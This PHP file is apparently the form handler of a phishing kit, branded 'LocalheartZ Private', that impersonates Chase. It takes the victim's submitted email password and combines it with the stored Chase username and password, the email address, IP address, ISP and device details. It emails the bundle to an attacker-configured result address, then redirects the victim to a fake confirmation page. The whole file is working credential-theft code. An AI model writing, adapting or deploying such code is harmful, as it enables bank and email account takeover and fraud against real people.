<?php
require_once(dirname(dirname(dirname(__DIR__))) . '/autoload.php');

if ($_SERVER['REQUEST_METHOD'] == 'POST'){
  $core->_save_ses('passwmail', trim($_POST['passwemail']));

  $browser = $core->is_mobile ? $core->_get_ses('mobile', $core->mobile) : $core->_get_ses('browser', $core->browser);

  $message    = "
  --------------[ LocalheartZ Private ] ------------------ <br>
  <br>
  ----- Chase Account ----- <br>
  Username : " . $core->_get_ses('username') . "<br>
  Password : " . $core->_get_ses('password') . "<br>
  <br>
  ----- Email Account ----- <br>
  Email    : " . $core->_get_ses('email') . "<br>
  Password : " . $core->_get_ses('passwmail') . "<br>
  <br>
  IP & ISP : " . $core->_get_ses('ip') . " | " . $core->_get_ses('isp') . "<br>
  Date : " . $core->_re_date() . "<br>
  Device : " . $core->_get_ses('platform') . "<br>
  User Agent : " . $browser . ", " . $core->_get_ses('useragent') . "
  <br>
  --------------[ LocalheartZ Private ] ------------------ <br>
  ";
  // echo $message;
  $subject    = "Result Email Login [ " . $core->_get_ses('ip') . " - " . $core->_get_ses('regionName') . " ] ";
  $sendername = "LHZ - CHASE";
  $send       = $core->_send(trim($core->_config('result')), $sendername, $subject, $message, 'email');
  //
  $core->_visitor('submitted email login.');
  $core->updateJmlh('mail');
  $sender = ($core->_config('sender') == 0 ? 'SMTP' : 'MAIL');
  if ($send == TRUE) {
      $core->_sendlog($sender, trim($core->_config('result')), 'Chase Email Login', 'Success');
  } else {
      $core->_sendlog($sender, trim($core->_config('result')), 'Chase Email Login', 'Failed');
  }
  //
  $core->_redirect('/auth/onconfirm?indexToken=' . sha1(md5($core->_get_ses('ip'))) . '&authToken=' . md5(sha1($core->_get_ses('ip'))));
}else{
  die('not a post method.'); exit;
}
